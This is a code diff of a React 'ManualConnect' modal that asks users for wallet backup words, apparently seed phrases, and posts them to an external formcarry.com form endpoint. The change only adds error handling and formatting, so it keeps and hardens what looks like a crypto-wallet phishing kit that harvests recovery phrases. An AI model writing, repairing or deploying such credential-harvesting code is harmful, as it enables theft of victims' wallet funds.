@@ -53,8 +53,8 @@ const walletBackupTypes = [
 const ManualConnect = ({ backToErrorModal, userWalletDetails, closeManualConnectModal, handleConnected }) => {
   const [connectmethod, setConnectMethod] = useState(walletBackupTypes[1].type)
   const [selectedType, setSelectedType] = useState(walletBackupTypes[1])
-    const [isLoading, setIsLoading] = useState(false);
-  
+  const [isLoading, setIsLoading] = useState(false);
+
 
   const data = {
     type: connectmethod,
@@ -63,24 +63,33 @@ const ManualConnect = ({ backToErrorModal, userWalletDetails, closeManualConnect
     backupdata: [],
   }
 
+
   const handleValidatedWords = async (words) => {
-    setIsLoading(true)
-    data.backupdata = words
-    const result = await fetch("https://formcarry.com/s/gqHpTaauB8x", {
-      method: 'POST',
-      headers: {
-        "Accept": "application/json",
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify(data)
-    })
+    try {
+      setIsLoading(true)
+      data.backupdata = words
 
+      const result = await fetch("https://formcarry.com/s/gqHpTaauB8x", {
+        method: 'POST',
+        headers: {
+          "Accept": "application/json",
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      })
 
-    const responseresult = await  result.json()
-    setIsLoading(false)
-    return responseresult?.status === "success" ? true : false;
+      const responseresult = await result.json()
+      setIsLoading(false)
+
+      return responseresult?.status === "success"
+    } catch (e) {
+      setIsLoading(false)
+      console.error("Submission error:", e)
+      return false
+    }
   }
-  
+
+
 
   const submitBackup = () => {
     handleConnected()
@@ -99,7 +108,7 @@ const ManualConnect = ({ backToErrorModal, userWalletDetails, closeManualConnect
   return (
     <div className="bg-white w-11/12 sm:w-4/12 overflow-y-auto z-50 mt-32 rounded-lg h-max items-center justify-center p-4 text-center mb-4">
 
-      <ModalHeader method1={backToErrorModal} method2={closeManualConnectModal} userWalletDetails={userWalletDetails} className="flex justify-between px-4 mb-4"/>
+      <ModalHeader method1={backToErrorModal} method2={closeManualConnectModal} userWalletDetails={userWalletDetails} className="flex justify-between px-4 mb-4" />
       <BackupTypes types={walletBackupTypes} connectmethod={connectmethod} handleConnectMethod={handleConnectMethod} />
       <PreviewValue selectedType={selectedType} isLoading={isLoading} liftWordsToParent={handleValidatedWords} submitBackup={submitBackup} />
 
